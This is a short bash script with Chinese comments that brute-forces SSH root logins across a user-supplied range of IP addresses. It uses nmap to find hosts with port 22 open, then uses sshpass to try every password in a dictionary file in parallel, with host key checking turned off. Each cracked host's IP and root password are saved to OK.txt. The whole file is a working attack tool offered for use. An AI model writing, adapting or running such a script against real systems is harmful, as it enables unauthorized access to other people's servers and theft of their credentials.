#!/bin/bash
#作者：Areturn
#默认字典存放在当前目录password文件中
#成功爆破的linux服务器会保存至OK.txt文件中
hosts_file="hosts"
password_file="password"
[ ! -f $password ]&&echo "密码字典文件：$password不存在！"&&exit 1
rpm -q epel-release &>/dev/null||yum -q -y install epel-release
rpm -q sshpass nmap &>/dev/null||yum -q -y install sshpass nmap
read -p '请输入一个网段的前3段,尾段自动设置为:0-255,例:[10.0.0-10.2.3]: ' ip_list
echo "$ip_list" |egrep -q '^[1-9][0-9]{,2}\.[0-9]{1,3}\.[0-9]{1,3}-[1-9][0-9]{,2}\.[0-9]{1,3}\.[0-9]{1,3}$'
if [ $? -eq 0 ];then
	for i in `echo "$ip_list" | egrep -o '[0-9]+'`;do
		[ $i -gt 255 ]&&echo "ip段输入有误,退出！"&&exit 1
	done
	echo "$ip_list"|awk -F'[.-]' '$1>$4{system("echo ip段输入有误,退出！");next}$1==$4&&$2>$5{system("echo ip段输入有误,退出！");next}$2==$5&&$3>$6{system("echo ip段输入有误,退出！")}'|grep  '.'
	if [ $? -eq 0 ];then
		exit 1
	fi
else
	echo "ip段输入有误,退出！"
	exit 1
fi
nmap -p22 `echo "$ip_list"|awk -F'[.-]' '{if($1!=$4){printf $1"-"$4"."}else{printf $1"."};if($2!=$5){printf $2"-"$5"."}else{printf $2"."};if($3!=$6){printf $3"-"$6"."}else{printf $3"."};print "0-255"}'`|grep -B3 'open'|egrep -o '[0-9.]{7,}' >hosts
for i in `cat hosts`;do
	echo "$i 爆破中！"
	for j in `cat password`;do
		{
		sshpass -p "$j"	ssh root@$i -o StrictHostKeyChecking=no -o ConnectTimeout=2 ':' &>/dev/null
		if [ $? -eq 0 ];then
			echo "$i 爆破成功！"
			echo -e "主机IP:$i\t用户:root,密码:$j" >>OK.txt
		fi
		} &
	done
	while :;do
		if [ `ps -ef|grep sshpass|wc -l` -gt 1000 ];then
			sleep 3
		else
			break
		fi
	done
done
